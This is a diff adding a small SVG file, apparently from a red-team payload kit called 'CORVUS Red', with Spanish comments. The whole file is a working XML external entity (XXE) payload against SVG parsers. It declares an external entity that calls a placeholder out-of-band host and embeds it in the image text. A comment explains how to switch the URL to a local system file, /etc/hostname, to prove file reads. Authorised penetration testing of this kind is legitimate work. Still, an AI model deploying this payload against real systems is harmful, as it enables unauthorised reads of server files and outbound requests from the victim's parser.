@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- CORVUS Red · XXE en parsers de SVG: entidad externa hacia OAST (no lee ficheros locales).
+     Solo si el cliente lo autoriza: cambiar la URL por file:///etc/hostname para demostrar lectura inocua. -->
+<!DOCTYPE svg [ <!ENTITY corvus SYSTEM "https://OAST_DOMAIN/corvus-xxe-svg"> ]>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="40">
+  <text x="5" y="25" font-size="14">CORVUS-XXE: &corvus;</text>
+</svg>
